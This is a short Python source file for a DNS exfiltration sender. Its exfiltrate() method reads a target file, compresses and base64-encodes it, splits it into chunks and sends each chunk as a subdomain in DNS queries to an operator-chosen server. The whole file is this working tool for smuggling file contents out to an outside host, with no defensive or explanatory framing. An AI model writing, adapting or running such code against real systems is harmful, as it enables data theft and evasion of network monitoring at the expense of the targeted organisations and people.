import dnslib
import zlib
import socket
import base64
import time

class DNSExSnd:
    def __init__(self, **kwargs):
        self.filename = kwargs.get('filename')
        self.filedata = None
        self.domain = kwargs.get('domain')
        self.dnsSrv = kwargs.get('dns')
        self.dnsPort = kwargs.get('dnsPort')
        self.numReq = kwargs.get('requests')
        self.delay = kwargs.get('delay')
        self.verbose = kwargs.get('verbose')
        self.zip = kwargs.get('zip')
    
    def loadData(self):
        try:
            print("Reading target file...") if self.verbose else None
            file = open(self.filename, "rb")
            self.filedata = file.read()
            file.close()
            if self.zip:
                print("Compressing target file...") if self.verbose else None
                self.filedata = zlib.compress(self.filedata)
        except FileNotFoundError as err: 
            print(f"Error reading target file: {err}")
            exit(1)
        except zlib.error as err:
            print(f"Error compressing target file: {err}")
            exit(1)

    def encodeData(self):
        print("Encoding target file to Base64...") if self.verbose else None
        self.filedata = (base64.b64encode(self.filedata)).decode('utf-8')

    def sendData(self):
        print("Splitting target file into chunks...") if self.verbose else None
        chunk_size = 32 # bytes
        num_chunks = len(self.filedata) // chunk_size
        if len(self.filedata) % chunk_size != 0:
            num_chunks += 1
        chunks = [self.filedata[i*chunk_size:(i+1)*chunk_size] for i in range(num_chunks)]
        print(f"Total chunks: {num_chunks}") if self.verbose else None

        print("Sending target file chunks...") if self.verbose else None
        for chunk in chunks:
            subdomain = f"{chunk}.{self.domain}"
            dns_query = dnslib.DNSRecord.question(subdomain).pack()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(self.numReq):
                print(f"Sending {subdomain} DNS query to {self.dnsSrv}") if self.verbose else None
                sock.sendto(dns_query, (self.dnsSrv, self.dnsPort))
                time.sleep(self.delay)

    def exfiltrate(self):
        self.loadData()
        self.encodeData()
        self.sendData()
